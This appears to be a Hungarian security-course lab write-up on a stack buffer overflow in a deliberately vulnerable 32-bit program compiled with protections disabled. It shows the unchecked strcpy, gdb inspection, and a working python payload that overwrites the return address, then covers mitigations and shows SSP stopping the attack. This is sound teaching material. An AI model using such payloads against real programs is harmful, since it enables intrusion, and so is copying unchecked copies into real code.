# 1

Make hívásakor ez fut le:

```default: noProtection

noProtection:
	gcc $(FOR_X86) $(COMPILER_FLAGS) $(gcc_FLAGS) $(DISABLE_SSP)
	gcc $(FOR_X86) $(gcc_FLAGS) $(LINKER_FLAGS_32) $(DISABLE_NX) $(DISABLE_PIE)  $(DISABLE_FULL_RELRO)
	$(DISABLE_ASLR)
```

# 2

Ez a sérülékenység:

```
void vulnerable_function(char *string)
{
    char buffer[8];
    strcpy(buffer, string);
}
```

A strcpy másol de nem ellenőrzi a hosszt

# 3

```bash
cd ./task-1
make
```

# 4

```bash
gdb -q ./app_32
```
A gdb-n belül:
1. nm app_32 | grep not_called
2. b *vulnerable_function
3. run AAAAAAAAAAAA - Megnézzük a verem állapotát x/20wx $esp segítségével.

# 5

**Támadás előtti (normál) állapot:**
```text
[ Magasabb memóriacímek ]
+-------------------------+
| char *string (mutató)   |  <- Argumentum (az argv[1] memóriacíme)
+-------------------------+
| Return Address (EIP)    |  <- Ide térne vissza a vezérlés a main() függvénybe
+-------------------------+
| Saved EBP               |  <- A hívó függvény (main) EBP regisztere (4 bájt)
+-------------------------+
| buffer[4..7]            |  <- \ buffer (8 bájt méretű tömb)
| buffer[0..3]            |  <- /
+-------------------------+
[ Alacsonyabb memóriacímek ]
```

**Támadás (Buffer Overflow) utáni állapot:**
```text
[ Magasabb memóriacímek ]
+-------------------------+
| char *string (mutató)   |
+-------------------------+
| Return Address (EIP)    |  <- Cím kicserélve, a not_called címére fog visszatérni (pl. \x96\x91\x04\x08)
+-------------------------+
| Saved EBP               |  <- BBBB (Felülírva a payloadból)
+-------------------------+
| buffer[4..7]            |  <- AAAA (Felülírva a payloadból)
| buffer[0..3]            |  <- AAAA (Felülírva a payloadból)
+-------------------------+
[ Alacsonyabb memóriacímek ]
```

# 6 

Megnézzük hol van a not_called

(gdb) p not_called
$1 = {void ()} 0x8049196 <not_called>

Látjuk az RET a 0xffffc60c címen van, és a buffer a 0xffffc5fc
így 16 byte-os paddinget kell megadjunk és a not_called függvény címét amit little endian-ban adunk meg
96 91 04 08

gdb --args ./app_32 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x96\x91\x04\x08")')"

# 7

Forráskód szintjén: hosszellenőrzés vagy strncpy

Fordítás szintjén: canary a stack frame végén 

Operációs rendszer szintjén: ASLR (memória címek véletlenszerűsítése) és NX/DEP bit használata, ami megakadályozza a verembe írt kód lefutását.

# 8

Engedélyezzük a védelmet: `make withSSP`

Futtatás eredménye:
```
*** stack smashing detected ***: terminated
Program received signal SIGABRT, Aborted.
```

**Véd a támadás ellen?** Igen.
**Magyarázat:** A `make withSSP` engedélyezi a Stack Smashing Protectiont (SSP). Ez egy ellenőrző értéket (canary) helyez el a stack-en a lokális változók és a visszatérési cím közé. A túlcsordulás során ez a canary is felülíródik a felesleges adatokkal. A függvény visszatérése előtt ellenőrzi ezt az értéket, és mivel látja, hogy megváltozott (túlcsordulás történt), hibával leállítja a programot, mielőtt a preparált (hamis) címre ugrana. 

